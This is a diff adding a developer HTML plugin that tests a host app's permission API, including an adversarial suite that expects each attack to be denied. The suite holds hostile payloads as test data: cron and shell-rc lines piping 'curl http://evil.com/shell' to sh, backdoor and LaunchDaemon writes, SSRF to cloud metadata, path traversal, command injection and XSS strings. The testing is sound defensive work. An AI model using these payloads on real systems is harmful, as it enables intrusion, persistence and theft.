@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Permission Tester - Nexus Plugin</title>
+  <link rel="stylesheet" href="{{NEXUS_API_URL}}/api/v1/theme.css" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: var(--font-sans);
+      background: var(--color-nx-deep);
+      color: var(--color-nx-text);
+      margin: 0;
+      padding: 1.5rem;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    h1 { font-size: 1.25rem; font-weight: 700; margin: 0 0 0.25rem; }
+    .subtitle { color: var(--color-nx-text-secondary); font-size: 0.8125rem; margin: 0 0 1.5rem; }
+    .accent { color: var(--color-nx-accent); }
+
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
+
+    .card {
+      background: var(--color-nx-surface);
+      border: 1px solid var(--color-nx-border);
+      border-radius: var(--radius-card);
+      padding: 1.25rem;
+    }
+    .card h2 {
+      font-size: 0.6875rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--color-nx-text-muted);
+      margin: 0 0 1rem;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .card h2 .badge {
+      font-size: 0.5625rem;
+      padding: 0.125rem 0.375rem;
+      border-radius: var(--radius-tag);
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+    .badge-medium { background: var(--color-nx-warning-muted); color: var(--color-nx-warning); }
+    .badge-high { background: var(--color-nx-error-muted); color: var(--color-nx-error); }
+    .badge-low { background: var(--color-nx-success-muted); color: var(--color-nx-success); }
+
+    .input-group {
+      display: flex;
+      gap: 0.5rem;
+      margin-bottom: 0.75rem;
+    }
+    input[type="text"] {
+      flex: 1;
+      padding: 0.5rem 0.75rem;
+      background: var(--color-nx-deep);
+      border: 1px solid var(--color-nx-border-subtle);
+      border-radius: var(--radius-button);
+      color: var(--color-nx-text);
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      outline: none;
+    }
+    input[type="text"]:focus {
+      border-color: var(--color-nx-accent);
+    }
+    input[type="text"]::placeholder {
+      color: var(--color-nx-text-ghost);
+    }
+
+    button {
+      padding: 0.5rem 0.875rem;
+      border-radius: var(--radius-button);
+      border: none;
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: all 150ms;
+    }
+    .btn-primary {
+      background: var(--color-nx-accent);
+      color: var(--color-nx-deep);
+    }
+    .btn-primary:hover { filter: brightness(1.1); }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-secondary {
+      background: var(--color-nx-overlay);
+      color: var(--color-nx-text-secondary);
+    }
+    .btn-secondary:hover { background: var(--color-nx-wash); }
+    .btn-danger {
+      background: var(--color-nx-error-muted);
+      color: var(--color-nx-error);
+    }
+    .btn-danger:hover { filter: brightness(1.1); }
+
+    .result {
+      margin-top: 0.75rem;
+      padding: 0.75rem;
+      border-radius: var(--radius-button);
+      font-family: var(--font-mono);
+      font-size: 0.6875rem;
+      line-height: 1.5;
+      max-height: 200px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .result-success {
+      background: var(--color-nx-success-muted);
+      border: 1px solid var(--color-nx-success);
+      color: var(--color-nx-success);
+    }
+    .result-error {
+      background: var(--color-nx-error-muted);
+      border: 1px solid var(--color-nx-error);
+      color: var(--color-nx-error);
+    }
+    .result-pending {
+      background: var(--color-nx-accent-muted);
+      border: 1px solid var(--color-nx-border-accent);
+      color: var(--color-nx-accent);
+      animation: pulse 1.5s infinite;
+    }
+    .result-empty {
+      background: var(--color-nx-overlay);
+      border: 1px solid var(--color-nx-border-subtle);
+      color: var(--color-nx-text-ghost);
+      text-align: center;
+      font-family: var(--font-sans);
+    }
+
+    .quick-paths {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.375rem;
+      margin-bottom: 0.75rem;
+    }
+    .quick-paths button {
+      padding: 0.25rem 0.5rem;
+      font-size: 0.625rem;
+      font-family: var(--font-mono);
+    }
+
+    textarea {
+      width: 100%;
+      padding: 0.5rem 0.75rem;
+      background: var(--color-nx-deep);
+      border: 1px solid var(--color-nx-border-subtle);
+      border-radius: var(--radius-button);
+      color: var(--color-nx-text);
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      resize: vertical;
+      min-height: 60px;
+      outline: none;
+      margin-bottom: 0.75rem;
+    }
+    textarea:focus { border-color: var(--color-nx-accent); }
+
+    .card.full-width { grid-column: 1 / -1; }
+
+    .status-connected {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.375rem;
+      padding: 0.25rem 0.625rem;
+      background: var(--color-nx-accent-muted);
+      border-radius: var(--radius-tag);
+      font-size: 0.6875rem;
+      font-weight: 500;
+      color: var(--color-nx-accent);
+    }
+    .status-dot {
+      width: 5px; height: 5px;
+      border-radius: 50%;
+      background: var(--color-nx-accent);
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+  </style>
+</head>
+<body>
+  <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.5rem;">
+    <div>
+      <h1>Permission <span class="accent">Tester</span></h1>
+      <p class="subtitle">Developer tool for exercising Host API permissions and runtime approval prompts</p>
+    </div>
+    <div id="connection-status"></div>
+  </div>
+
+  <div class="grid">
+    <!-- Read File -->
+    <div class="card">
+      <h2>Read File <span class="badge badge-medium">medium</span></h2>
+      <div class="quick-paths">
+        <button class="btn-secondary" onclick="setInput('read-path', '/etc/hostname')">hostname</button>
+        <button class="btn-secondary" onclick="setInput('read-path', '/etc/hosts')">hosts</button>
+        <button class="btn-secondary" onclick="setInput('read-path', '/etc/resolv.conf')">resolv.conf</button>
+        <button class="btn-secondary" onclick="setInput('read-path', '/tmp/nexus-test.txt')">tmp test</button>
+      </div>
+      <div class="input-group">
+        <input type="text" id="read-path" placeholder="/path/to/file" />
+        <button class="btn-primary" onclick="testRead()">Read</button>
+      </div>
+      <div id="read-result" class="result result-empty">Click "Read" to test filesystem:read</div>
+    </div>
+
+    <!-- List Directory -->
+    <div class="card">
+      <h2>List Directory <span class="badge badge-medium">medium</span></h2>
+      <div class="quick-paths">
+        <button class="btn-secondary" onclick="setInput('list-path', '/tmp')">/tmp</button>
+        <button class="btn-secondary" onclick="setInput('list-path', '/etc')">/etc</button>
+        <button class="btn-secondary" onclick="setInput('list-path', '/home')">/home</button>
+        <button class="btn-secondary" onclick="setInput('list-path', '/')">/</button>
+      </div>
+      <div class="input-group">
+        <input type="text" id="list-path" placeholder="/path/to/directory" />
+        <button class="btn-primary" onclick="testList()">List</button>
+      </div>
+      <div id="list-result" class="result result-empty">Click "List" to test filesystem:read (dirs)</div>
+    </div>
+
+    <!-- Write File -->
+    <div class="card">
+      <h2>Write File <span class="badge badge-high">high</span></h2>
+      <div class="quick-paths">
+        <button class="btn-secondary" onclick="setInput('write-path', '/tmp/nexus-test.txt')">/tmp test</button>
+        <button class="btn-secondary" onclick="setInput('write-path', '/tmp/nexus-dir/nested.txt')">nested</button>
+      </div>
+      <div class="input-group">
+        <input type="text" id="write-path" placeholder="/path/to/file" />
+      </div>
+      <textarea id="write-content" placeholder="File content to write...">Hello from the Permission Tester plugin!</textarea>
+      <button class="btn-danger" onclick="testWrite()">Write</button>
+      <div id="write-result" class="result result-empty">Click "Write" to test filesystem:write</div>
+    </div>
+
+    <!-- Network Proxy -->
+    <div class="card">
+      <h2>Network Proxy <span class="badge badge-medium">medium</span></h2>
+      <div class="quick-paths">
+        <button class="btn-secondary" onclick="setInput('proxy-url', 'https://httpbin.org/get')">httpbin</button>
+        <button class="btn-secondary" onclick="setInput('proxy-url', 'http://localhost:9600/api/openapi.json')">host api</button>
+        <button class="btn-secondary" onclick="setInput('proxy-url', 'http://192.168.1.1')">local net</button>
+      </div>
+      <div class="input-group">
+        <input type="text" id="proxy-url" placeholder="https://example.com" />
+        <button class="btn-primary" onclick="testProxy()">Fetch</button>
+      </div>
+      <div id="proxy-result" class="result result-empty">Click "Fetch" to test network proxy</div>
+    </div>
+
+    <!-- System Info -->
+    <div class="card">
+      <h2>System Info <span class="badge badge-low">low</span></h2>
+      <button class="btn-primary" onclick="testSystemInfo()">Fetch System Info</button>
+      <div id="system-result" class="result result-empty">Click to test system:info</div>
+    </div>
+
+    <!-- Process List -->
+    <div class="card">
+      <h2>Process List <span class="badge badge-medium">medium</span></h2>
+      <button class="btn-primary" onclick="testProcessList()">List Processes</button>
+      <div id="process-result" class="result result-empty">Click to test process:list</div>
+    </div>
+
+    <!-- Security Tests -->
+    <div class="card full-width">
+      <h2>Security Tests <span class="badge badge-high">adversarial</span></h2>
+      <p style="font-size: 0.75rem; color: var(--color-nx-text-secondary); margin: 0 0 1rem;">
+        Automated tests that attempt to bypass permissions and security boundaries. Every test should fail with 403. A passing test (200) means a security bug.
+      </p>
+      <div style="display: flex; gap: 0.5rem;">
+        <button class="btn-danger" onclick="runSecurityTests()">Run All Security Tests</button>
+        <button class="btn-secondary" onclick="copyResult('security-result')" id="security-copy">Copy Results</button>
+      </div>
+      <div id="security-result" class="result result-empty" style="max-height: 400px;">Click to run adversarial security tests</div>
+    </div>
+
+    <!-- Raw Request -->
+    <div class="card full-width">
+      <h2>Raw API Request</h2>
+      <div class="input-group">
+        <select id="raw-method" style="padding: 0.5rem; background: var(--color-nx-deep); border: 1px solid var(--color-nx-border-subtle); border-radius: var(--radius-button); color: var(--color-nx-text); font-family: var(--font-mono); font-size: 0.75rem;">
+          <option>GET</option>
+          <option>POST</option>
+          <option>PUT</option>
+          <option>DELETE</option>
+        </select>
+        <input type="text" id="raw-path" placeholder="/api/v1/system/info" style="flex: 2;" />
+        <button class="btn-primary" onclick="testRaw()">Send</button>
+      </div>
+      <textarea id="raw-body" placeholder="Request body (JSON, for POST/PUT)..." style="min-height: 40px;"></textarea>
+      <div id="raw-result" class="result result-empty">Send a raw request to any Host API endpoint</div>
+    </div>
+  </div>
+
+  <script>
+    let config = { token: '', apiUrl: '' };
+
+    async function copyResult(id) {
+      const el = document.getElementById(id);
+      try {
+        await navigator.clipboard.writeText(el.textContent);
+        const btn = document.getElementById(id + '-copy') || el.previousElementSibling;
+        if (btn) {
+          const orig = btn.textContent;
+          btn.textContent = 'Copied!';
+          setTimeout(() => { btn.textContent = orig; }, 1500);
+        }
+      } catch {
+        // Fallback for iframes without clipboard permission
+        const range = document.createRange();
+        range.selectNodeContents(el);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+      }
+    }
+
+    function setInput(id, value) {
+      document.getElementById(id).value = value;
+    }
+
+    function setResult(id, status, text) {
+      const el = document.getElementById(id);
+      el.className = `result result-${status}`;
+      el.textContent = typeof text === 'string' ? text : JSON.stringify(text, null, 2);
+    }
+
+    async function apiCall(method, path, body) {
+      const url = `${config.apiUrl}${path}`;
+      const opts = {
+        method,
+        headers: {
+          'Authorization': `Bearer ${config.token}`,
+          'Content-Type': 'application/json',
+        },
+      };
+      if (body && (method === 'POST' || method === 'PUT')) {
+        opts.body = JSON.stringify(body);
+      }
+
+      const start = performance.now();
+      const res = await fetch(url, opts);
+      const elapsed = Math.round(performance.now() - start);
+      const text = await res.text();
+
+      let parsed;
+      try { parsed = JSON.parse(text); } catch { parsed = text; }
+
+      return {
+        ok: res.ok,
+        status: res.status,
+        elapsed,
+        data: parsed,
+      };
+    }
+
+    function formatResult(result) {
+      const header = `${result.status} (${result.elapsed}ms)`;
+      const body = typeof result.data === 'string'
+        ? result.data
+        : JSON.stringify(result.data, null, 2);
+      return `${header}\n${'─'.repeat(40)}\n${body}`;
+    }
+
+    async function testRead() {
+      const path = document.getElementById('read-path').value.trim();
+      if (!path) return;
+      setResult('read-result', 'pending', 'Requesting... (approval dialog may appear)');
+      try {
+        const result = await apiCall('GET', `/api/v1/fs/read?path=${encodeURIComponent(path)}`);
+        setResult('read-result', result.ok ? 'success' : 'error', formatResult(result));
+      } catch (e) {
+        setResult('read-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function testList() {
+      const path = document.getElementById('list-path').value.trim();
+      if (!path) return;
+      setResult('list-result', 'pending', 'Requesting... (approval dialog may appear)');
+      try {
+        const result = await apiCall('GET', `/api/v1/fs/list?path=${encodeURIComponent(path)}`);
+        setResult('list-result', result.ok ? 'success' : 'error', formatResult(result));
+      } catch (e) {
+        setResult('list-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function testWrite() {
+      const path = document.getElementById('write-path').value.trim();
+      const content = document.getElementById('write-content').value;
+      if (!path) return;
+      setResult('write-result', 'pending', 'Requesting... (approval dialog may appear)');
+      try {
+        const result = await apiCall('POST', '/api/v1/fs/write', { path, content });
+        setResult('write-result', result.ok ? 'success' : 'error', formatResult(result));
+      } catch (e) {
+        setResult('write-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function testProxy() {
+      const url = document.getElementById('proxy-url').value.trim();
+      if (!url) return;
+      setResult('proxy-result', 'pending', 'Proxying request...');
+      try {
+        const result = await apiCall('POST', '/api/v1/network/proxy', {
+          url,
+          method: 'GET',
+          headers: {},
+        });
+        setResult('proxy-result', result.ok ? 'success' : 'error', formatResult(result));
+      } catch (e) {
+        setResult('proxy-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function testSystemInfo() {
+      setResult('system-result', 'pending', 'Fetching...');
+      try {
+        const result = await apiCall('GET', '/api/v1/system/info');
+        setResult('system-result', result.ok ? 'success' : 'error', formatResult(result));
+      } catch (e) {
+        setResult('system-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function testProcessList() {
+      setResult('process-result', 'pending', 'Fetching...');
+      try {
+        const result = await apiCall('GET', '/api/v1/process/list');
+        if (result.ok && Array.isArray(result.data)) {
+          const summary = `${result.status} (${result.elapsed}ms)\n${'─'.repeat(40)}\n${result.data.length} processes\n\nTop 10 by memory:\n${
+            result.data
+              .sort((a, b) => b.memory - a.memory)
+              .slice(0, 10)
+              .map(p => `  ${p.name} — ${(p.memory / 1024 / 1024).toFixed(1)} MB`)
+              .join('\n')
+          }`;
+          setResult('process-result', 'success', summary);
+        } else {
+          setResult('process-result', result.ok ? 'success' : 'error', formatResult(result));
+        }
+      } catch (e) {
+        setResult('process-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function testRaw() {
+      const method = document.getElementById('raw-method').value;
+      const path = document.getElementById('raw-path').value.trim();
+      const bodyText = document.getElementById('raw-body').value.trim();
+      if (!path) return;
+
+      let body = null;
+      if (bodyText && (method === 'POST' || method === 'PUT')) {
+        try { body = JSON.parse(bodyText); } catch {
+          setResult('raw-result', 'error', 'Invalid JSON in request body');
+          return;
+        }
+      }
+
+      setResult('raw-result', 'pending', 'Sending...');
+      try {
+        const url = `${config.apiUrl}${path}`;
+        const opts = {
+          method,
+          headers: {
+            'Authorization': `Bearer ${config.token}`,
+            'Content-Type': 'application/json',
+          },
+        };
+        if (body) opts.body = JSON.stringify(body);
+
+        const start = performance.now();
+        const res = await fetch(url, opts);
+        const elapsed = Math.round(performance.now() - start);
+        const text = await res.text();
+        let parsed;
+        try { parsed = JSON.parse(text); } catch { parsed = text; }
+
+        const header = `${res.status} (${elapsed}ms)`;
+        const formatted = typeof parsed === 'string' ? parsed : JSON.stringify(parsed, null, 2);
+        setResult('raw-result', res.ok ? 'success' : 'error', `${header}\n${'─'.repeat(40)}\n${formatted}`);
+      } catch (e) {
+        setResult('raw-result', 'error', `Network error: ${e.message}`);
+      }
+    }
+
+    async function runSecurityTests() {
+      const el = document.getElementById('security-result');
+      el.className = 'result result-pending';
+      el.textContent = 'Running security tests...\n';
+
+      // Common macOS Tauri data dir paths to try
+      const dataDirCandidates = [
+        `${config.apiUrl.replace('http://localhost:9600', '')}/../Library/Application Support/com.nexus.app`,
+        '/Users/Shared/com.nexus.app',
+      ];
+
+      // We'll discover the real data dir from an error or system info
+      let lines = [];
+      let passed = 0;
+      let failed = 0;
+
+      function log(icon, name, status, detail) {
+        // Any non-2xx status is a valid rejection (403, 401, 400, 502, etc.)
+        const ok = !String(status).startsWith('2') || status === 'error';
+        if (ok) passed++; else failed++;
+        lines.push(`${ok ? '\u2705' : '\u274c'} ${name}`);
+        lines.push(`   ${icon} Expected: non-2xx  Got: ${status}${detail ? '  ' + detail : ''}`);
+        lines.push('');
+        el.textContent = lines.join('\n');
+      }
+
+      async function expectDeny(name, method, path, body) {
+        try {
+          const result = await apiCall(method, path, body);
+          log('\u{1f6e1}\ufe0f', name, result.status,
+            result.ok ? 'SECURITY BREACH - request succeeded!' : '');
+        } catch (e) {
+          log('\u{1f6e1}\ufe0f', name, 'error', e.message);
+        }
+      }
+
+      // --- Data directory access ---
+
+      await expectDeny(
+        'Read permissions.json (data dir)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent(
+          '~/Library/Application Support/com.nexus.app/permissions.json'
+        )
+      );
+
+      await expectDeny(
+        'Read plugins.json (data dir)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent(
+          '~/Library/Application Support/com.nexus.app/plugins.json'
+        )
+      );
+
+      await expectDeny(
+        'List data directory',
+        'GET', '/api/v1/fs/list?path=' + encodeURIComponent(
+          '~/Library/Application Support/com.nexus.app/'
+        )
+      );
+
+      // --- Path traversal attacks ---
+
+      // Path traversal tests target the Nexus data dir (always blocked, can never
+      // be approved). A traversal to /etc may succeed if the user previously
+      // approved /etc during manual testing — that's correct behavior, not a bug.
+
+      await expectDeny(
+        'Path traversal: /tmp/../../etc/shadow (non-existent)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/../../etc/shadow')
+      );
+
+      await expectDeny(
+        'Path traversal to data dir (read)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/../Library/Application Support/com.nexus.app/permissions.json')
+      );
+
+      await expectDeny(
+        'Path traversal to data dir (write)',
+        'POST', '/api/v1/fs/write', {
+          path: '/tmp/../Library/Application Support/com.nexus.app/evil.json',
+          content: '{"grants":{}}'
+        }
+      );
+
+      // --- Relative path (should require absolute) ---
+
+      await expectDeny(
+        'Relative path write: ../../../tmp/pwned',
+        'POST', '/api/v1/fs/write', {
+          path: '../../../tmp/pwned',
+          content: 'escaped sandbox'
+        }
+      );
+
+      // --- Write to data directory ---
+
+      await expectDeny(
+        'Write to data dir: permissions.json',
+        'POST', '/api/v1/fs/write', {
+          path: '~/Library/Application Support/com.nexus.app/permissions.json',
+          content: '{"grants":{}}'
+        }
+      );
+
+      // --- Network SSRF attacks ---
+
+      await expectDeny(
+        'SSRF: AWS metadata endpoint',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://169.254.169.254/latest/meta-data/',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'SSRF: GCP metadata endpoint',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://metadata.google.internal/computeMetadata/v1/',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'SSRF: Host API relay (anti-relay)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://localhost:9600/api/v1/system/info',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'SSRF: Host API via host.docker.internal',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://host.docker.internal:9600/api/v1/system/info',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'SSRF: Azure metadata',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+          method: 'GET', headers: {}
+        }
+      );
+
+      // --- Auth bypass attempts ---
+
+      try {
+        const noAuthRes = await fetch(`${config.apiUrl}/api/v1/system/info`);
+        const noAuthOk = noAuthRes.status === 401;
+        if (noAuthOk) passed++; else failed++;
+        lines.push(`${noAuthOk ? '\u2705' : '\u274c'} No auth header`);
+        lines.push(`   \u{1f6e1}\ufe0f Expected: 401  Got: ${noAuthRes.status}`);
+        lines.push('');
+      } catch (e) {
+        passed++;
+        lines.push(`\u2705 No auth header`);
+        lines.push(`   \u{1f6e1}\ufe0f Error (acceptable): ${e.message}`);
+        lines.push('');
+      }
+
+      try {
+        const fakeRes = await fetch(`${config.apiUrl}/api/v1/system/info`, {
+          headers: { 'Authorization': 'Bearer fake-token-00000000-0000-0000-0000-000000000000' }
+        });
+        const fakeOk = fakeRes.status === 401;
+        if (fakeOk) passed++; else failed++;
+        lines.push(`${fakeOk ? '\u2705' : '\u274c'} Fake bearer token`);
+        lines.push(`   \u{1f6e1}\ufe0f Expected: 401  Got: ${fakeRes.status}`);
+        lines.push('');
+      } catch (e) {
+        passed++;
+        lines.push(`\u2705 Fake bearer token`);
+        lines.push(`   \u{1f6e1}\ufe0f Error (acceptable): ${e.message}`);
+        lines.push('');
+      }
+
+      // --- Cross-plugin settings access ---
+      // Our token scopes us to our own plugin. Try accessing another plugin's settings
+      // by modifying the endpoint (there's no cross-plugin settings endpoint, so this
+      // tests that the settings API only returns OUR settings)
+
+      try {
+        const settingsRes = await apiCall('GET', '/api/v1/settings');
+        const isScoped = settingsRes.ok; // should return our (empty) settings
+        if (isScoped) passed++; else failed++;
+        lines.push(`${isScoped ? '\u2705' : '\u274c'} Settings scoped to own plugin`);
+        lines.push(`   \u{1f6e1}\ufe0f Settings API returned data scoped to our token (${typeof settingsRes.data === 'object' ? Object.keys(settingsRes.data).length + ' keys' : 'unexpected'})`);
+        lines.push('');
+      } catch (e) {
+        lines.push(`\u274c Settings scope test error: ${e.message}`);
+        lines.push('');
+        failed++;
+      }
+
+      // Try writing settings with keys that don't exist in our manifest (should be rejected)
+      await expectDeny(
+        'Write unknown settings key (schema violation)',
+        'PUT', '/api/v1/settings', {
+          'admin_override': true,
+          'secret_key': 'injected'
+        }
+      );
+
+      // --- Permission boundary: Docker (not granted) ---
+
+      await expectDeny(
+        'Docker list (no docker:read permission)',
+        'GET', '/api/v1/docker/containers'
+      );
+
+      await expectDeny(
+        'Docker stats (no docker:read permission)',
+        'GET', '/api/v1/docker/stats/some-container-id'
+      );
+
+      // --- RCE: Write to executable/privileged locations ---
+
+      await expectDeny(
+        'RCE: Write to /usr/local/bin (executable injection)',
+        'POST', '/api/v1/fs/write', {
+          path: '/usr/local/bin/nexus-backdoor',
+          content: '#!/bin/sh\ncurl http://evil.com/pwned'
+        }
+      );
+
+      await expectDeny(
+        'RCE: Write to cron.d (scheduled execution)',
+        'POST', '/api/v1/fs/write', {
+          path: '/etc/cron.d/nexus-evil',
+          content: '* * * * * root curl http://evil.com/pwned'
+        }
+      );
+
+      await expectDeny(
+        'RCE: Write to LaunchDaemons (macOS persistence)',
+        'POST', '/api/v1/fs/write', {
+          path: '/Library/LaunchDaemons/com.evil.backdoor.plist',
+          content: '<?xml version="1.0"?><plist><dict><key>Label</key><string>evil</string></dict></plist>'
+        }
+      );
+
+      await expectDeny(
+        'RCE: Write to user LaunchAgents (macOS persistence)',
+        'POST', '/api/v1/fs/write', {
+          path: '~/Library/LaunchAgents/com.evil.backdoor.plist',
+          content: '<?xml version="1.0"?><plist><dict><key>Label</key><string>evil</string></dict></plist>'
+        }
+      );
+
+      await expectDeny(
+        'RCE: Write to .bashrc (shell injection)',
+        'POST', '/api/v1/fs/write', {
+          path: '~/.bashrc',
+          content: 'curl http://evil.com/shell | sh'
+        }
+      );
+
+      await expectDeny(
+        'RCE: Write to .zshrc (shell injection)',
+        'POST', '/api/v1/fs/write', {
+          path: '~/.zshrc',
+          content: 'curl http://evil.com/shell | sh'
+        }
+      );
+
+      // --- RCE: Null byte injection (C-era truncation) ---
+
+      await expectDeny(
+        'Null byte: /etc/passwd%00.txt',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/etc/passwd\x00.txt')
+      );
+
+      await expectDeny(
+        'Null byte in write path',
+        'POST', '/api/v1/fs/write', {
+          path: '/tmp/safe\x00/etc/passwd',
+          content: 'null byte injection test'
+        }
+      );
+
+      // --- RCE: Command injection via path ---
+
+      await expectDeny(
+        'Command injection: path with backticks',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/`id`')
+      );
+
+      await expectDeny(
+        'Command injection: path with $() substitution',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/$(whoami)')
+      );
+
+      await expectDeny(
+        'Command injection: path with pipe',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/test|curl evil.com')
+      );
+
+      await expectDeny(
+        'Command injection: path with semicolon',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/test;curl evil.com')
+      );
+
+      // --- Network: Internal service probing ---
+
+      await expectDeny(
+        'Probe: Docker socket via HTTP',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://localhost:2375/containers/json',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'Probe: Docker socket via host.docker.internal',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://host.docker.internal:2375/containers/json',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'Probe: Kubernetes API',
+        'POST', '/api/v1/network/proxy', {
+          url: 'https://localhost:6443/api/v1/pods',
+          method: 'GET', headers: {}
+        }
+      );
+
+      // --- Scheme abuse ---
+
+      await expectDeny(
+        'Scheme: file:// protocol (local file read via proxy)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'file:///etc/passwd',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'Scheme: gopher:// protocol (SSRF amplification)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'gopher://localhost:6379/_SET%20pwned%20true',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'Scheme: ftp:// protocol',
+        'POST', '/api/v1/network/proxy', {
+          url: 'ftp://localhost/etc/passwd',
+          method: 'GET', headers: {}
+        }
+      );
+
+      // --- IPv6 bypass attacks ---
+
+      await expectDeny(
+        'IPv6: loopback [::1] to Host API',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://[::1]:9600/api/v1/system/info',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'IPv6: mapped 127.0.0.1 (::ffff:127.0.0.1)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://[::ffff:127.0.0.1]:9600/api/v1/system/info',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'IPv6: mapped metadata (::ffff:169.254.169.254)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://[::ffff:169.254.169.254]/latest/meta-data/',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'IPv6: link-local (fe80::1)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://[fe80::1]/',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'IPv6: unique local (fc00::1)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://[fc00::1]/',
+          method: 'GET', headers: {}
+        }
+      );
+
+      // --- Decimal/octal IP notation ---
+
+      await expectDeny(
+        'Decimal IP: 2130706433 (127.0.0.1) to Host API',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://2130706433:9600/api/v1/system/info',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'Octal IP: 0177.0.0.1 (127.0.0.1)',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://0177.0.0.1:9600/api/v1/system/info',
+          method: 'GET', headers: {}
+        }
+      );
+
+      await expectDeny(
+        'Decimal IP: 2852039166 (169.254.169.254) metadata',
+        'POST', '/api/v1/network/proxy', {
+          url: 'http://2852039166/latest/meta-data/',
+          method: 'GET', headers: {}
+        }
+      );
+
+      // --- Special device files ---
+
+      await expectDeny(
+        'Device read: /dev/zero (memory exhaustion)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/dev/zero')
+      );
+
+      await expectDeny(
+        'Device read: /dev/urandom',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/dev/urandom')
+      );
+
+      // --- Double URL encoding ---
+
+      await expectDeny(
+        'Double encoding: %252F..%252F (traversal after double decode)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('%2Fetc%2Fpasswd')
+      );
+
+      // --- Unicode path tricks ---
+
+      await expectDeny(
+        'Unicode: fullwidth slash \uff0f in path',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/\uff0f..\\etc\\passwd')
+      );
+
+      await expectDeny(
+        'Unicode: dot (U+FF0E) in traversal',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/\uff0e\uff0e/etc/passwd')
+      );
+
+      // --- Control characters in paths ---
+
+      await expectDeny(
+        'CRLF injection in path',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/test\r\n/etc/passwd')
+      );
+
+      await expectDeny(
+        'Tab character in path',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/test\t/etc/passwd')
+      );
+
+      // --- Extremely long path (buffer overflow attempt) ---
+
+      await expectDeny(
+        'Extremely long path (100KB)',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/' + 'A'.repeat(100000))
+      );
+
+      // --- Approval dialog XSS ---
+      // Path gets displayed in the approval dialog — test that special chars don't escape
+
+      await expectDeny(
+        'XSS in path: script tag',
+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/<scr' + 'ipt>alert("xss")<' + '/scr' + 'ipt>')
+      );
+
+      await expectDeny(
+        'XSS in path: event handler',
